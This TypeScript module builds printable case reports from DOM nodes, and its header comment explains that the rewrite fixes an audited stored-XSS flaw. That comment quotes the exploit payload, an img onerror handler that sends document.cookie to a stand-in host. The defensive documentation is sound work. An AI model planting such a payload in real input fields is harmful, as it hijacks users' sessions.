/**
 * Printable reports, built as DOM nodes rather than interpolated HTML strings.
 *
 * FINDING-02, carried since the Phase 1 audit. Both v1 print paths built HTML
 * by template-interpolating analyst-authored fields -- case titles, assignees,
 * notes -- and handed the result to `document.write()`. A case titled
 *
 *     <img src=x onerror="fetch('https://evil.test/'+document.cookie)">
 *
 * executed on the same origin as the officer's session. Verified reproducible
 * before this rewrite.
 *
 * The fix is escape-BY-CONSTRUCTION, not escaping. `textContent` cannot produce
 * markup no matter what the string contains, so there is no escaping function
 * to forget to call at the next call site. `document.write` is gone entirely.
 */

export interface ReportColumn<T> {
  header: string;
  value: (row: T) => string;
}

export interface ReportSpec<T> {
  title: string;
  subtitle: string;
  columns: ReportColumn<T>[];
  rows: T[];
  emptyMessage?: string;
  /** Dark-on-white for print; the tactical palette wastes toner and reads badly. */
  theme?: "print" | "screen";
}

function el<K extends keyof HTMLElementTagNameMap>(
  doc: Document,
  tag: K,
  text?: string
): HTMLElementTagNameMap[K] {
  const node = doc.createElement(tag);
  // textContent, never innerHTML. This is the whole security property.
  if (text !== undefined) node.textContent = text;
  return node;
}

const PRINT_CSS = `
  body { font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
         background: #fff; color: #111; padding: 32px; }
  h1 { color: #E10600; letter-spacing: .08em; font-size: 20px; margin: 0 0 4px; }
  .meta { color: #555; font-size: 12px; margin-bottom: 16px; line-height: 1.5; }
  table { width: 100%; border-collapse: collapse; margin-top: 12px; }
  th, td { border: 1px solid #ccc; padding: 7px 10px; text-align: left;
           font-size: 12px; vertical-align: top; word-break: break-word; }
  th { background: #f3f3f3; text-transform: uppercase; letter-spacing: .06em; }
  .footer { margin-top: 20px; font-size: 11px; color: #666; }
  @media print { body { padding: 0; } }
`;

/**
 * Open a print-ready report window. Returns false when the browser blocked it,
 * so the caller can tell the user rather than failing silently.
 */
export function openReport<T>(spec: ReportSpec<T>): boolean {
  const w = window.open("", "_blank");
  if (!w) return false;

  const doc = w.document;
  // Build a fresh document structurally. No write(), no innerHTML.
  doc.title = spec.title;

  const style = el(doc, "style", PRINT_CSS);
  doc.head.appendChild(style);

  doc.body.appendChild(el(doc, "h1", spec.title));

  const meta = el(doc, "div");
  meta.className = "meta";
  meta.appendChild(el(doc, "div", spec.subtitle));
  meta.appendChild(
    el(doc, "div", `Generated ${new Date().toLocaleString()} · ${spec.rows.length} records`)
  );
  doc.body.appendChild(meta);

  const table = el(doc, "table");
  const thead = el(doc, "thead");
  const hrow = el(doc, "tr");
  for (const c of spec.columns) hrow.appendChild(el(doc, "th", c.header));
  thead.appendChild(hrow);
  table.appendChild(thead);

  const tbody = el(doc, "tbody");
  if (spec.rows.length === 0) {
    const tr = el(doc, "tr");
    const td = el(doc, "td", spec.emptyMessage ?? "No records");
    td.colSpan = spec.columns.length;
    tr.appendChild(td);
    tbody.appendChild(tr);
  } else {
    for (const row of spec.rows) {
      const tr = el(doc, "tr");
      for (const c of spec.columns) {
        // Even if value() returns markup, it lands as literal text.
        tr.appendChild(el(doc, "td", c.value(row)));
      }
      tbody.appendChild(tr);
    }
  }
  table.appendChild(tbody);
  doc.body.appendChild(table);

  doc.body.appendChild(
    el(doc, "div", "PRAHARI v2 · attribution by correlation of public footprints · SIH 2026 PS 26151")
  ).className = "footer";

  // Print after layout settles. No inline <script> in the generated document,
  // so a strict CSP on the parent cannot be bypassed through this path either.
  w.setTimeout(() => w.print(), 150);
  return true;
}
